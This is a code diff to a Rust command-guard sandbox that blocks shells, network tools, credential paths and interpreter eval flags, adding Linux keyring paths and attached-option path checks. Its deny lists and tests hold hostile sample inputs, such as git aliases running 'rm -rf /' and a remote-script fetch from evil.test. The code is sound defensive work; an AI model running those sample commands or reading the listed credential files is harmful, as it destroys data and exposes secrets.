@@ -11,30 +11,153 @@ use super::jail::WorkspaceSet;
 /// 用户配置只能收窄可执行集合，永远不能放宽黑名单。
 const DENY_PROGRAMS: &[&str] = &[
     // shell 与脚本宿主
-    "cmd", "command", "powershell", "pwsh", "wscript", "cscript", "mshta", "rundll32",
-    "regsvr32", "installutil", "mofcomp", "bash", "sh", "zsh", "dash", "ksh", "fish", "csh",
-    "tcsh", "osascript", "expect",
+    "cmd",
+    "command",
+    "powershell",
+    "pwsh",
+    "wscript",
+    "cscript",
+    "mshta",
+    "rundll32",
+    "regsvr32",
+    "installutil",
+    "mofcomp",
+    "bash",
+    "sh",
+    "zsh",
+    "dash",
+    "ksh",
+    "fish",
+    "csh",
+    "tcsh",
+    "osascript",
+    "expect",
     // 系统/服务/注册表/计划任务
-    "reg", "regedit", "regini", "sc", "net", "net1", "netsh", "schtasks", "at", "taskkill",
-    "tasklist", "wmic", "wevtutil", "gpupdate", "gpresult", "bcdedit", "vssadmin", "fsutil",
-    "diskpart", "format", "chkdsk", "defrag", "cacls", "icacls", "takeown", "attrib", "subst",
-    "runas", "sudo", "doas", "pkexec", "su", "psexec", "psexesvc", "wsl", "wslconfig",
+    "reg",
+    "regedit",
+    "regini",
+    "sc",
+    "net",
+    "net1",
+    "netsh",
+    "schtasks",
+    "at",
+    "taskkill",
+    "tasklist",
+    "wmic",
+    "wevtutil",
+    "gpupdate",
+    "gpresult",
+    "bcdedit",
+    "vssadmin",
+    "fsutil",
+    "diskpart",
+    "format",
+    "chkdsk",
+    "defrag",
+    "cacls",
+    "icacls",
+    "takeown",
+    "attrib",
+    "subst",
+    "runas",
+    "sudo",
+    "doas",
+    "pkexec",
+    "su",
+    "psexec",
+    "psexesvc",
+    "wsl",
+    "wslconfig",
     // 关机/重启/破坏性
-    "shutdown", "restart", "reboot", "halt", "poweroff", "init", "mkfs", "dd", "fdisk", "parted",
-    "shred", "wipefs", "mount", "umount", "systemctl", "service", "launchctl", "kill", "killall",
-    "pkill", "rm", "rmdir", "del", "erase", "rd", "mv", "move", "ren", "rename", "copy", "xcopy",
-    "robocopy", "chmod", "chown", "chgrp", "ln", "mklink", "truncate",
+    "shutdown",
+    "restart",
+    "reboot",
+    "halt",
+    "poweroff",
+    "init",
+    "mkfs",
+    "dd",
+    "fdisk",
+    "parted",
+    "shred",
+    "wipefs",
+    "mount",
+    "umount",
+    "systemctl",
+    "service",
+    "launchctl",
+    "kill",
+    "killall",
+    "pkill",
+    "rm",
+    "rmdir",
+    "del",
+    "erase",
+    "rd",
+    "mv",
+    "move",
+    "ren",
+    "rename",
+    "copy",
+    "xcopy",
+    "robocopy",
+    "chmod",
+    "chown",
+    "chgrp",
+    "ln",
+    "mklink",
+    "truncate",
     // 网络下载 / 外联 / 隧道
-    "curl", "wget", "ftp", "sftp", "scp", "ssh", "sshd", "telnet", "nc", "ncat", "netcat", "socat",
-    "bitsadmin", "certutil", "certreq", "makecab", "expand", "extrac32", "ftpget", "tftp",
-    "nslookup", "dig", "host", "ping", "tracert", "arp", "ipconfig", "ifconfig", "route",
+    "curl",
+    "wget",
+    "ftp",
+    "sftp",
+    "scp",
+    "ssh",
+    "sshd",
+    "telnet",
+    "nc",
+    "ncat",
+    "netcat",
+    "socat",
+    "bitsadmin",
+    "certutil",
+    "certreq",
+    "makecab",
+    "expand",
+    "extrac32",
+    "ftpget",
+    "tftp",
+    "nslookup",
+    "dig",
+    "host",
+    "ping",
+    "tracert",
+    "arp",
+    "ipconfig",
+    "ifconfig",
+    "route",
     // 包管理器之外的"安装器"与远程执行
-    "winget", "choco", "scoop", "msiexec", "install", "uninstall",
+    "winget",
+    "choco",
+    "scoop",
+    "msiexec",
+    "install",
+    "uninstall",
     // 下载即执行的包运行器：npx/bunx 本质是"拉取任意包并运行其代码"，
     // 与 curl/wget 同类，属于项目明确排除的远程代码执行通道
-    "npx", "bunx",
+    "npx",
+    "bunx",
     // 环境变量/进程注入
-    "setx", "set", "export", "env", "printenv", "eval", "exec", "source",
+    "setx",
+    "set",
+    "export",
+    "env",
+    "printenv",
+    "eval",
+    "exec",
+    "source",
 ];
 
 /// 这些扩展名的程序本身就是脚本/快捷方式，直接执行等于绕过白名单
@@ -44,8 +167,26 @@ const DENY_PROGRAMS: &[&str] = &[
 /// 它们由 [`SCRIPT_HOST_EXTENSIONS`] 单独把关：只有程序基名通过允许列表
 /// 且未命中硬黑名单时才放行，执行时还要经 `cmd.exe` 包装与参数审查。
 const DENY_EXTENSIONS: &[&str] = &[
-    "com", "ps1", "psm1", "vbs", "vbe", "js", "jse", "wsf", "wsh", "msi", "msp", "scr", "pif",
-    "lnk", "reg", "inf", "hta", "cpl", "jar", "application",
+    "com",
+    "ps1",
+    "psm1",
+    "vbs",
+    "vbe",
+    "js",
+    "jse",
+    "wsf",
+    "wsh",
+    "msi",
+    "msp",
+    "scr",
+    "pif",
+    "lnk",
+    "reg",
+    "inf",
+    "hta",
+    "cpl",
+    "jar",
+    "application",
 ];
 
 /// `cmd.exe` 能解释的脚本扩展名（仅允许列表内的程序可用）
@@ -67,23 +208,85 @@ const INTERPRETERS: &[&str] = &[
 
 /// 解释器的求值类参数（一律拒绝）
 const EVAL_FLAGS: &[&str] = &[
-    "-c", "-e", "--eval", "--exec", "--execute", "-p", "--print", "-i", "--interactive", "-r",
-    "--require", "--import", "-Command", "-EncodedCommand", "-eC", "/c", "/k",
+    "-c",
+    "-e",
+    "--eval",
+    "--exec",
+    "--execute",
+    "-p",
+    "--print",
+    "-i",
+    "--interactive",
+    "-r",
+    "--require",
+    "--import",
+    "-Command",
+    "-EncodedCommand",
+    "-eC",
+    "/c",
+    "/k",
 ];
 
 /// `python -m` / `node --eval` 之类：模块名必须落在安全清单内
 const SAFE_MODULES: &[&str] = &[
-    "pytest", "unittest", "json.tool", "compileall", "venv", "black", "ruff", "mypy", "flake8",
-    "isort", "pip.index", "py_compile",
+    "pytest",
+    "unittest",
+    "json.tool",
+    "compileall",
+    "venv",
+    "black",
+    "ruff",
+    "mypy",
+    "flake8",
+    "isort",
+    "pip.index",
+    "py_compile",
 ];
 
 /// 参数中不允许出现的敏感路径片段
 const SENSITIVE_PATH_FRAGMENTS: &[&str] = &[
-    ".ssh", ".aws", ".gnupg", ".kube", "id_rsa", "id_ed25519", "id_ecdsa", ".netrc",
-    "appdata/roaming", "appdata\\roaming", "appdata/local", "appdata\\local", "/etc/passwd",
-    "/etc/shadow", "/etc/sudoers", "config.json", "credentials", "data.db", ".env",
-    "authorized_keys", "known_hosts", ".git-credentials", "cookies", "login data",
+    ".ssh",
+    ".aws",
+    ".gnupg",
+    ".kube",
+    "id_rsa",
+    "id_ed25519",
+    "id_ecdsa",
+    ".netrc",
+    "appdata/roaming",
+    "appdata\\roaming",
+    "appdata/local",
+    "appdata\\local",
+    "/etc/passwd",
+    "/etc/shadow",
+    "/etc/sudoers",
+    "config.json",
+    "credentials",
+    "data.db",
+    ".env",
+    "authorized_keys",
+    "known_hosts",
+    ".git-credentials",
+    "cookies",
+    "login data",
 ];
+
+/// Linux 专属的敏感路径片段
+///
+/// 与 [`SENSITIVE_PATH_FRAGMENTS`] 分开是为了不改变 Windows 的判定集合：
+/// 这些目录在 Windows 上可能只是普通项目名，不应被误伤。
+#[cfg(target_os = "linux")]
+const PLATFORM_SENSITIVE_PATH_FRAGMENTS: &[&str] = &[
+    ".local/share/keyrings",
+    ".local/share/kwalletd",
+    ".password-store",
+    "/etc/gshadow",
+    "/proc/self/environ",
+    "/proc/1/environ",
+];
+
+#[cfg(not(target_os = "linux"))]
+const PLATFORM_SENSITIVE_PATH_FRAGMENTS: &[&str] = &[];
 
 /// 参数中不允许出现的危险开关
 const DENY_ARG_FLAGS: &[&str] = &[
@@ -102,7 +305,14 @@ const DENY_ARG_FLAGS: &[&str] = &[
 /// 永远不会以 program 身份出现，因此程序黑名单拦不住它。必须在参数层无条件拒绝，
 /// 否则"硬黑名单优先于用户配置"的承诺就不成立。
 const EXEC_FLAGS: &[&str] = &[
-    "-exec", "-execdir", "-ok", "-okdir", "-delete", "-fdelete", "--exec", "--execute",
+    "-exec",
+    "-execdir",
+    "-ok",
+    "-okdir",
+    "-delete",
+    "-fdelete",
+    "--exec",
+    "--execute",
 ];
 
 /// 这些包管理器的子命令会"下载并执行任意包"
@@ -396,10 +606,7 @@ fn check_sensitive_args(base: &str, args: &[String]) -> Result<(), String> {
 
         // 代执行参数（find -exec、xargs --exec 等）：一律拒绝，与解释器无关
         if EXEC_FLAGS.contains(&lower.as_str()) {
-            return Err(format!(
-                "参数「{}」会代执行其它程序/脚本，已被阻止",
-                arg
-            ));
+            return Err(format!("参数「{}」会代执行其它程序/脚本，已被阻止", arg));
         }
 
         // 解释器求值参数：python -c / node -e / ruby -e ...
@@ -432,12 +639,12 @@ fn check_sensitive_args(base: &str, args: &[String]) -> Result<(), String> {
 
         // 敏感路径片段
         let normalized = lower.replace('\\', "/");
-        for frag in SENSITIVE_PATH_FRAGMENTS {
+        for frag in SENSITIVE_PATH_FRAGMENTS
+            .iter()
+            .chain(PLATFORM_SENSITIVE_PATH_FRAGMENTS.iter())
+        {
             if normalized.contains(&frag.replace('\\', "/")) {
-                return Err(format!(
-                    "已阻止参数「{}」：涉及敏感路径「{}」",
-                    arg, frag
-                ));
+                return Err(format!("已阻止参数「{}」：涉及敏感路径「{}」", arg, frag));
             }
         }
 
@@ -492,10 +699,7 @@ fn check_git_config_escapes(args: &[String]) -> Result<(), String> {
             if let Some(setting) = args.get(i + 1) {
                 if let Some((key, value)) = setting.split_once('=') {
                     if let Some(reason) = dangerous_reason(key, value) {
-                        return Err(format!(
-                            "已阻止 git 配置项「{}」：{}",
-                            setting, reason
-                        ));
+                        return Err(format!("已阻止 git 配置项「{}」：{}", setting, reason));
                     }
                 }
             }
@@ -547,9 +751,7 @@ fn check_git_destructive_subcommands(args: &[String]) -> Result<(), String> {
             continue;
         }
         if lower == "clean" {
-            let dry_run = args[i + 1..]
-                .iter()
-                .any(|a| a == "-n" || a == "--dry-run");
+            let dry_run = args[i + 1..].iter().any(|a| a == "-n" || a == "--dry-run");
             if !dry_run {
                 return Err(
                     "已阻止 git clean：批量删除不经过回收站与快照。请先用 `git clean -n` 预览，再用 delete_path 逐项删除（可回滚）".to_string(),
@@ -656,52 +858,85 @@ fn check_runtime_args(base: &str, args: &[String]) -> Result<(), String> {
     Ok(())
 }
 
+/// 拆出参数中可能内嵌的路径值
+///
+/// 命令守卫不能只看"独立参数"：`-I/etc`、`-o/tmp/x`、`-Wl,-rpath,/path`
+/// 都把路径粘在开关里。这里只提取**看起来像路径**的片段，纯开关
+/// （`-j4`、`--verbose`）仍会被跳过。
+fn path_candidates(arg: &str) -> Vec<&str> {
+    let windows = cfg!(windows);
+
+    if !arg.starts_with('-') {
+        return vec![arg.split_once('=').map(|(_, value)| value).unwrap_or(arg)];
+    }
+
+    // `--flag=/abs/path`
+    if let Some((_, value)) = arg.split_once('=') {
+        return vec![value];
+    }
+
+    // 链接器参数：`-Wl,-rpath,/path` / `-Wl,-rpath=/path`
+    if let Some(rest) = arg.strip_prefix("-Wl,") {
+        return rest
+            .split(',')
+            .filter_map(|part| {
+                let value = part.split_once('=').map(|(_, value)| value).unwrap_or(part);
+                let path_like = looks_like_absolute_arg(value, windows) || value.contains("..");
+                path_like.then_some(value)
+            })
+            .collect();
+    }
+
+    // 短选项粘连值：`-I/path`、`-L/path`、`-o/path`
+    if !arg.starts_with("--") {
+        let rest = &arg[1..];
+        if let Some(tail) = rest.get(1..) {
+            let path_like = looks_like_absolute_arg(tail, windows) || tail.contains("..");
+            if path_like {
+                return vec![tail];
+            }
+        }
+    }
+
+    Vec::new()
+}
+
 /// 参数中的绝对路径与 `..` 逃逸检查
 fn check_path_args(args: &[String], cwd: &Path, workspaces: &WorkspaceSet) -> Result<(), String> {
     for arg in args {
-        if arg.starts_with('-') && !arg.contains('=') {
-            continue; // 纯开关
-        }
-        // 支持 `--flag=/abs/path` 形式
-        let candidate = arg.split_once('=').map(|(_, v)| v).unwrap_or(arg.as_str());
-        let candidate = candidate.trim();
-        if candidate.is_empty() {
-            continue;
-        }
-
-        if looks_like_absolute_arg(candidate, cfg!(windows)) {
-            if candidate.starts_with('~') {
-                return Err(format!("已阻止参数「{}」：不允许访问用户主目录", arg));
+        for candidate in path_candidates(arg) {
+            let candidate = candidate.trim();
+            if candidate.is_empty() {
+                continue;
             }
-            match workspaces.resolve(candidate) {
-                Ok(_) => {}
-                Err(e) => {
-                    return Err(format!("已阻止参数「{}」：{}", arg, e));
+
+            if looks_like_absolute_arg(candidate, cfg!(windows)) {
+                if candidate.starts_with('~') {
+                    return Err(format!("已阻止参数「{}」：不允许访问用户主目录", arg));
                 }
-            }
-            continue;
-        }
-
-        // 相对路径：不允许通过 .. 逃出工作目录
-        if candidate.contains("..") {
-            let mut probe = cwd.to_path_buf();
-            for comp in Path::new(candidate).components() {
-                match comp {
-                    std::path::Component::Normal(c) => probe.push(c),
-                    std::path::Component::ParentDir => {
-                        probe.pop();
-                        if !workspaces
-                            .list()
-                            .iter()
-                            .any(|r| probe.starts_with(&r.path))
-                        {
-                            return Err(format!(
-                                "已阻止参数「{}」：路径越出工作区",
-                                arg
-                            ));
-                        }
+                match workspaces.resolve(candidate) {
+                    Ok(_) => {}
+                    Err(e) => {
+                        return Err(format!("已阻止参数「{}」：{}", arg, e));
                     }
-                    _ => {}
+                }
+                continue;
+            }
+
+            // 相对路径：不允许通过 .. 逃出工作目录
+            if candidate.contains("..") {
+                let mut probe = cwd.to_path_buf();
+                for comp in Path::new(candidate).components() {
+                    match comp {
+                        std::path::Component::Normal(c) => probe.push(c),
+                        std::path::Component::ParentDir => {
+                            probe.pop();
+                            if !workspaces.list().iter().any(|r| probe.starts_with(&r.path)) {
+                                return Err(format!("已阻止参数「{}」：路径越出工作区", arg));
+                            }
+                        }
+                        _ => {}
+                    }
                 }
             }
         }
@@ -771,8 +1006,8 @@ fn resolve_program(
     let path_var = std::env::var_os("PATH").unwrap_or_default();
     let mut names = vec![program.to_string()];
     if cfg!(windows) {
-        let pathext = std::env::var("PATHEXT")
-            .unwrap_or_else(|_| ".COM;.EXE;.BAT;.CMD".to_string());
+        let pathext =
+            std::env::var("PATHEXT").unwrap_or_else(|_| ".COM;.EXE;.BAT;.CMD".to_string());
         for ext in pathext.split(';') {
             let ext = ext.trim().to_ascii_lowercase();
             if ext.is_empty() {
@@ -825,6 +1060,29 @@ fn is_windows_executable(path: &Path) -> bool {
         .unwrap_or(false)
 }
 
+/// Linux 图形会话相关的环境变量
+///
+/// 少了它们，子进程里的 GTK/Qt 程序会报 "cannot open display"，截图/测试
+/// 这类需要真实窗口的命令全部失效。这里只传递"会话怎么连"的地址，
+/// 不传递任何密钥（`XAUTHORITY` 是文件路径，不是 cookie 本身）。
+#[cfg(unix)]
+const GUI_ENV: &[&str] = &[
+    "DISPLAY",
+    "WAYLAND_DISPLAY",
+    "XAUTHORITY",
+    "XDG_RUNTIME_DIR",
+    "XDG_SESSION_TYPE",
+    "XDG_CURRENT_DESKTOP",
+    "XDG_SESSION_DESKTOP",
+    "DESKTOP_SESSION",
+    "DBUS_SESSION_BUS_ADDRESS",
+    "GDK_BACKEND",
+    "QT_QPA_PLATFORM",
+];
+
+#[cfg(not(unix))]
+const GUI_ENV: &[&str] = &[];
+
 /// 只传递白名单环境变量，绝不把 API Key / Token 交给子进程
 pub fn sanitized_env() -> Vec<(String, String)> {
     const KEEP: &[&str] = &[
@@ -867,7 +1125,7 @@ pub fn sanitized_env() -> Vec<(String, String)> {
     ];
 
     let mut env: Vec<(String, String)> = Vec::new();
-    for key in KEEP {
+    for key in KEEP.iter().chain(GUI_ENV.iter()) {
         if let Ok(value) = std::env::var(key) {
             if is_secret_like(key) {
                 continue; // 防御性：将来有人往 KEEP 里加了敏感项也会被拦下
@@ -880,9 +1138,17 @@ pub fn sanitized_env() -> Vec<(String, String)> {
 
 fn is_secret_like(key: &str) -> bool {
     let upper = key.to_ascii_uppercase();
-    ["KEY", "TOKEN", "SECRET", "PASSWORD", "PASSWD", "CREDENTIAL", "AUTH"]
-        .iter()
-        .any(|needle| upper.contains(needle))
+    [
+        "KEY",
+        "TOKEN",
+        "SECRET",
+        "PASSWORD",
+        "PASSWD",
+        "CREDENTIAL",
+        "AUTH",
+    ]
+    .iter()
+    .any(|needle| upper.contains(needle))
 }
 
 #[cfg(test)]
@@ -902,8 +1168,8 @@ mod tests {
         pub struct Temp(PathBuf);
         impl Temp {
             pub fn new(tag: &str) -> Self {
-                let dir = std::env::temp_dir()
-                    .join(format!("konata-{}-{}", tag, uuid::Uuid::new_v4()));
+                let dir =
+                    std::env::temp_dir().join(format!("konata-{}-{}", tag, uuid::Uuid::new_v4()));
                 std::fs::create_dir_all(&dir).unwrap();
                 Self(dir)
             }
@@ -933,7 +1199,20 @@ mod tests {
         let guard = CommandGuard::new(&cfg);
 
         let (ws, _tmp) = test_set();
-        for program in ["cmd", "cmd.exe", "C:\\Windows\\System32\\cmd.exe", "certutil", "curl", "rm", "powershell", "shutdown", "reg", "schtasks", "npx", "bunx"] {
+        for program in [
+            "cmd",
+            "cmd.exe",
+            "C:\\Windows\\System32\\cmd.exe",
+            "certutil",
+            "curl",
+            "rm",
+            "powershell",
+            "shutdown",
+            "reg",
+            "schtasks",
+            "npx",
+            "bunx",
+        ] {
             let err = guard.check(program, &[], None, &ws).unwrap_err();
             assert!(err.contains("敏感命令已被阻止"), "{program} => {err}");
         }
@@ -960,7 +1239,10 @@ mod tests {
         // 没有代执行参数时 find 照常可用
         let ok = guard.check(
             "find",
-            &[".", "-name", "*.rs"].into_iter().map(String::from).collect::<Vec<_>>(),
+            &[".", "-name", "*.rs"]
+                .into_iter()
+                .map(String::from)
+                .collect::<Vec<_>>(),
             None,
             &ws,
         );
@@ -971,6 +1253,11 @@ mod tests {
     fn blocks_git_alias_shell_escapes() {
         let guard = guard();
         let (ws, _tmp) = test_set();
+        // PATH 里没有 git 时所有调用都只会报「找不到程序」，测不到别名规则
+        if guard.check("git", &[], None, &ws).is_err() {
+            eprintln!("跳过：本机 PATH 中找不到 git");
+            return;
+        }
         for args in [
             vec!["-c", "alias.pwn=!sh -c 'rm -rf /'", "pwn"],
             vec!["-c", "alias.pwn=!rm -rf /", "pwn"],
@@ -981,11 +1268,16 @@ mod tests {
             assert!(err.contains("别名"), "{args:?} => {err}");
         }
         // 普通 git 调用不受影响（含带 `!` 的提交信息）
-        assert!(guard.check("git", &["status".to_string()], None, &ws).is_ok());
+        assert!(guard
+            .check("git", &["status".to_string()], None, &ws)
+            .is_ok());
         assert!(guard
             .check(
                 "git",
-                &["commit", "-m", "fix: != x"].into_iter().map(String::from).collect::<Vec<_>>(),
+                &["commit", "-m", "fix: != x"]
+                    .into_iter()
+                    .map(String::from)
+                    .collect::<Vec<_>>(),
                 None,
                 &ws,
             )
@@ -998,12 +1290,45 @@ mod tests {
         let guard = CommandGuard::new(&ToolConfig::default());
         let allowed = guard.allowed_programs();
         for program in [
-            "rg", "fd", "jq", "yq", "diff", "sort", "uniq", "cut", "tr", "stat", "file", "which",
-            "tree", "gofmt", "golangci-lint", "clang", "clang++", "gcc", "g++", "ninja", "meson",
-            "just", "shellcheck", "ruff", "black", "mypy", "poetry", "pdm", "swift", "xcodebuild",
-            "vitest", "jest", "vite", "esbuild",
+            "rg",
+            "fd",
+            "jq",
+            "yq",
+            "diff",
+            "sort",
+            "uniq",
+            "cut",
+            "tr",
+            "stat",
+            "file",
+            "which",
+            "tree",
+            "gofmt",
+            "golangci-lint",
+            "clang",
+            "clang++",
+            "gcc",
+            "g++",
+            "ninja",
+            "meson",
+            "just",
+            "shellcheck",
+            "ruff",
+            "black",
+            "mypy",
+            "poetry",
+            "pdm",
+            "swift",
+            "xcodebuild",
+            "vitest",
+            "jest",
+            "vite",
+            "esbuild",
         ] {
-            assert!(allowed.iter().any(|p| p == program), "{program} 应在允许列表中");
+            assert!(
+                allowed.iter().any(|p| p == program),
+                "{program} 应在允许列表中"
+            );
         }
     }
 
@@ -1026,12 +1351,7 @@ mod tests {
             assert!(err.contains("代执行"), "{program} {args:?} => {err}");
         }
         // 正常用法不受影响（rg 未安装时只会是"找不到程序"，绝不能是代执行拦截）
-        let normal = guard.check(
-            "rg",
-            &["pattern".to_string(), "src".to_string()],
-            None,
-            &ws,
-        );
+        let normal = guard.check("rg", &["pattern".to_string(), "src".to_string()], None, &ws);
         if let Err(e) = normal {
             assert!(!e.contains("代执行"), "普通 rg 调用被误伤：{e}");
         }
@@ -1042,6 +1362,11 @@ mod tests {
     fn blocks_git_config_rce_and_destructive_clean() {
         let guard = guard();
         let (ws, _tmp) = test_set();
+        // 同上：没有 git 时先跳过，避免把「环境缺依赖」误报成规则失效
+        if guard.check("git", &[], None, &ws).is_err() {
+            eprintln!("跳过：本机 PATH 中找不到 git");
+            return;
+        }
         for args in [
             vec!["-c", "core.sshCommand=evil", "push"],
             vec!["-c", "core.hooksPath=/tmp/evil", "commit"],
@@ -1057,12 +1382,7 @@ mod tests {
 
         // clean 只放行 dry-run
         let err = guard
-            .check(
-                "git",
-                &["clean".to_string(), "-fdx".to_string()],
-                None,
-                &ws,
-            )
+            .check("git", &["clean".to_string(), "-fdx".to_string()], None, &ws)
             .unwrap_err();
         assert!(err.contains("git clean"), "{err}");
         assert!(guard
@@ -1086,9 +1406,19 @@ mod tests {
             assert!(err.contains("下载并执行"), "{program} {args:?} => {err}");
         }
         // 普通子命令照常
-        assert!(guard.check("npm", &["install".to_string()], None, &ws).is_ok());
         assert!(guard
-            .check("npm", &["init", "-y"].into_iter().map(String::from).collect::<Vec<_>>(), None, &ws)
+            .check("npm", &["install".to_string()], None, &ws)
+            .is_ok());
+        assert!(guard
+            .check(
+                "npm",
+                &["init", "-y"]
+                    .into_iter()
+                    .map(String::from)
+                    .collect::<Vec<_>>(),
+                None,
+                &ws
+            )
             .is_ok());
     }
 
@@ -1097,11 +1427,27 @@ mod tests {
         let guard = guard();
         let (ws, _tmp) = test_set();
         let err = guard
-            .check("deno", &["run", "https://evil.test/x.ts"].into_iter().map(String::from).collect::<Vec<_>>(), None, &ws)
+            .check(
+                "deno",
+                &["run", "https://evil.test/x.ts"]
+                    .into_iter()
+                    .map(String::from)
+                    .collect::<Vec<_>>(),
+                None,
+                &ws,
+            )
             .unwrap_err();
         assert!(err.contains("网络地址"), "{err}");
         let err = guard
-            .check("deno", &["eval", "1+1"].into_iter().map(String::from).collect::<Vec<_>>(), None, &ws)
+            .check(
+                "deno",
+                &["eval", "1+1"]
+                    .into_iter()
+                    .map(String::from)
+                    .collect::<Vec<_>>(),
+                None,
+                &ws,
+            )
             .unwrap_err();
         assert!(err.contains("eval"), "{err}");
     }
@@ -1110,7 +1456,14 @@ mod tests {
     fn blocks_script_extensions() {
         let guard = guard();
         let (ws, _tmp) = test_set();
-        for program in ["build.bat", "run.ps1", "evil.vbs", "x.js", "setup.msi", "a.lnk"] {
+        for program in [
+            "build.bat",
+            "run.ps1",
+            "evil.vbs",
+            "x.js",
+            "setup.msi",
+            "a.lnk",
+        ] {
             let err = guard.check(program, &[], None, &ws).unwrap_err();
             assert!(
                 err.contains("敏感命令已被阻止") || err.contains("不允许执行"),
@@ -1123,7 +1476,9 @@ mod tests {
     fn blocks_unknown_programs() {
         let guard = guard();
         let (ws, _tmp) = test_set();
-        let err = guard.check("totally-unknown-tool", &[], None, &ws).unwrap_err();
+        let err = guard
+            .check("totally-unknown-tool", &[], None, &ws)
+            .unwrap_err();
         assert!(err.contains("不在允许列表中"), "{err}");
     }
 
@@ -1148,13 +1503,14 @@ mod tests {
     fn blocks_unsafe_python_module() {
         let guard = guard();
         let (ws, _tmp) = test_set();
-        let err = guard.check(
-            "python",
-            &["-m".to_string(), "pip".to_string(), "install".to_string()],
-            None,
-            &ws,
-        )
-        .unwrap_err();
+        let err = guard
+            .check(
+                "python",
+                &["-m".to_string(), "pip".to_string(), "install".to_string()],
+                None,
+                &ws,
+            )
+            .unwrap_err();
         assert!(err.contains("模块"), "{err}");
 
         // 白名单模块允许
@@ -1189,7 +1545,27 @@ mod tests {
             let err = guard
                 .check("cat", &[arg.to_string()], None, &ws)
                 .unwrap_err();
-            assert!(err.contains("敏感") || err.contains("阻止"), "{arg} => {err}");
+            assert!(
+                err.contains("敏感") || err.contains("阻止"),
+                "{arg} => {err}"
+            );
+        }
+    }
+
+    /// Linux 凭据目录即使位于工作区内也必须拒绝（片段检查先于路径约束）
+    #[cfg(target_os = "linux")]
+    #[test]
+    fn blocks_linux_credential_fragments_inside_workspace() {
+        let guard = guard();
+        let (ws, _tmp) = test_set();
+        for arg in [
+            ".password-store/work.gpg",
+            ".local/share/keyrings/login.keyring",
+        ] {
+            let err = guard
+                .check("cargo", &[arg.to_string()], None, &ws)
+                .unwrap_err();
+            assert!(err.contains("敏感"), "{arg} => {err}");
         }
     }
 
@@ -1197,11 +1573,52 @@ mod tests {
     fn blocks_absolute_paths_outside_workspace() {
         let guard = guard();
         let (ws, _tmp) = test_set();
-        let outside = if cfg!(windows) { "C:\\Windows\\win.ini" } else { "/etc/hosts" };
+        let outside = if cfg!(windows) {
+            "C:\\Windows\\win.ini"
+        } else {
+            "/etc/hosts"
+        };
+        // 用 cargo（构建环境里必然存在）而不是 cat：PATH 里没有该程序时
+        // 报错会变成「找不到程序」，测不到路径检查
         let err = guard
-            .check("cat", &[outside.to_string()], None, &ws)
+            .check("cargo", &[outside.to_string()], None, &ws)
             .unwrap_err();
         assert!(err.contains("阻止"), "{err}");
+    }
+
+    /// 路径粘在开关里（`-I/etc`、`-Wl,-rpath,/path`）也必须受工作区约束
+    #[test]
+    fn blocks_attached_option_paths_outside_workspace() {
+        let guard = guard();
+        let (ws, _tmp) = test_set();
+        let outside = if cfg!(windows) {
+            "C:\\Windows\\win.ini"
+        } else {
+            "/etc/hosts"
+        };
+        for arg in [
+            format!("-I{outside}"),
+            format!("--include={outside}"),
+            format!("-Wl,-rpath,{outside}"),
+        ] {
+            let err = guard
+                .check("cargo", std::slice::from_ref(&arg), None, &ws)
+                .unwrap_err();
+            assert!(err.contains("阻止"), "{arg} => {err}");
+        }
+    }
+
+    /// 纯开关不能被当成内嵌路径（否则 `-j4`、`--verbose` 会被误伤）
+    #[test]
+    fn allows_plain_flags() {
+        let guard = guard();
+        let (ws, _tmp) = test_set();
+        for arg in ["-j4", "--verbose", "-Wl,--gc-sections"] {
+            assert!(
+                guard.check("cargo", &[arg.to_string()], None, &ws).is_ok(),
+                "{arg} 不应被当成路径"
+            );
+        }
     }
 
     #[test]
@@ -1209,7 +1626,7 @@ mod tests {
         let guard = guard();
         let (ws, tmp) = test_set();
         let err = guard
-            .check("ls", &["../../".to_string()], None, &ws)
+            .check("cargo", &["../../".to_string()], None, &ws)
             .unwrap_err();
         assert!(err.contains("越出工作区"), "{err}");
         drop(tmp);
@@ -1220,9 +1637,16 @@ mod tests {
         let guard = CommandGuard::new(&ToolConfig::default());
         let (ws, _tmp) = test_set();
         std::fs::create_dir_all(ws.default_path().join("src")).unwrap();
+        // 同样用 cargo：这里验证的是"相对参数 + cwd + 环境脱敏"，
+        // 与具体程序无关，不该依赖开发机装了 git
         let checked = guard
-            .check("git", &["status".to_string(), "src".to_string()], None, &ws)
-            .expect("git status 应当被允许");
+            .check(
+                "cargo",
+                &["build".to_string(), "src".to_string()],
+                None,
+                &ws,
+            )
+            .expect("cargo build src 应当被允许");
         assert_eq!(checked.cwd, ws.default_path());
         assert!(checked.env.iter().all(|(k, _)| !is_secret_like(k)));
     }
@@ -1239,7 +1663,9 @@ mod tests {
     #[test]
     fn sensitive_detection_helper() {
         assert!(CommandGuard::is_sensitive("cmd.exe"));
-        assert!(CommandGuard::is_sensitive("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"));
+        assert!(CommandGuard::is_sensitive(
+            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        ));
         assert!(CommandGuard::is_sensitive("evil.ps1"));
         // .cmd/.bat 本身不再是"硬黑名单"，是否可用取决于基名白名单
         assert!(!CommandGuard::is_sensitive("script.bat"));
@@ -1253,11 +1679,24 @@ mod tests {
         let guard = guard();
         let (ws, _tmp) = test_set();
 
-        // 允许列表内的 npm：不再被扩展名硬拦。本机没装 npm 时错误应是
-        // "找不到程序"（说明已经走到 PATH 解析），而不是"不允许执行"
-        let err = guard.check("npm.cmd", &[], None, &ws).unwrap_err();
-        assert!(!err.contains("不允许执行"), "{err}");
-        assert!(err.contains("找不到程序"), "{err}");
+        // 允许列表内的 npm：不再被扩展名硬拦。
+        // 装了 npm 的机器应当解析到真实路径；没装则错误必须是"找不到程序"
+        // （说明已经走到 PATH 解析），两种情况下都不能是"不允许执行"。
+        match guard.check("npm.cmd", &[], None, &ws) {
+            Ok(checked) => assert!(
+                checked
+                    .program
+                    .to_string_lossy()
+                    .to_lowercase()
+                    .ends_with("npm.cmd"),
+                "应当解析到 npm.cmd，实际 {}",
+                checked.program.display()
+            ),
+            Err(err) => {
+                assert!(!err.contains("不允许执行"), "{err}");
+                assert!(err.contains("找不到程序"), "{err}");
+            }
+        }
 
         // 任意脚本仍然被拦（基名不在允许列表内）
         for program in ["cleanup.bat", "evil.cmd"] {
@@ -1273,11 +1712,8 @@ mod tests {
     #[test]
     fn cmd_script_arg_is_quoted_and_rejects_metacharacters() {
         let script = Path::new(r"C:\Program Files\nodejs\npm.cmd");
-        let arg = build_cmd_script_arg(
-            script,
-            &["install".to_string(), "a b".to_string()],
-        )
-        .unwrap();
+        let arg =
+            build_cmd_script_arg(script, &["install".to_string(), "a b".to_string()]).unwrap();
